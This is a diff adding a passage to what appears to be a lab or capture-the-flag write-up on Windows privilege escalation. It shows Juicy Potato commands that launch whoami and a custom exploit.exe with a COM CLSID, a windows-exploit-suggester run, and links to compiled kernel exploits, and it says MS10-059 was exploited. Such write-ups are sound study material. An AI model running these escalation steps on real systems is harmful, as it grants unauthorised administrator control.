@@ -61,5 +61,47 @@ https://www.exploit-db.com/exploits/50057
 
 ### Here I used two methods because I had practiced a lot on the first one :
 
+### THE FIRST :
+
+Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami
+
+![1](https://user-images.githubusercontent.com/123066149/220948663-46fef5e7-f029-4b8b-b5ad-29232a382ca4.PNG)
+
+Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p C:\Users\tolis\Desktop\exploit.exe
+
+![image](https://user-images.githubusercontent.com/123066149/220949125-52a7f087-13c5-4030-b344-0b4b0fea7675.png)
+
+### THE SECOND :
+
+### No Hofix I will use a kernel exploit :
+
+![image](https://user-images.githubusercontent.com/123066149/220949802-990f7813-a5da-4a64-874b-2a9fa392118a.png)
+
+python2.7 windows-exploit-suggester.py -i ../sysinfo.txt -d 2023-02-18-mssb.xls
+
+![image](https://user-images.githubusercontent.com/123066149/220950502-1d629eb2-411d-492d-875f-bba730e82827.png)
+
+### After a redirection in a file and cleaning :
+
+![image](https://user-images.githubusercontent.com/123066149/220951019-28ff53bb-d828-4d72-803b-7d32aecc4646.png)
+
+### I used this resource for kernel exploit which is really very useful :
+
+https://kakyouim.hatenablog.com/entry/2020/05/27/010807
+
+### : This repo for the compiled exploit :
+
+https://github.com/SecWiki/windows-kernel-exploits
+
+### And these resources for kernel vulnerabilities on windows :
+
+https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+https://github.com/gladiatx0r/Powerless
+https://github.com/rasta-mouse/Watson
+
+#### And thanks to these resources I have exploited a vuln kernel very quickly (MS10-059) :
+
+![image](https://user-images.githubusercontent.com/123066149/220956467-fa85a83a-268f-49f4-aba8-33917974a4f6.png)
+
 
 # ${{\color{purple}Points of Improvement}}\ $
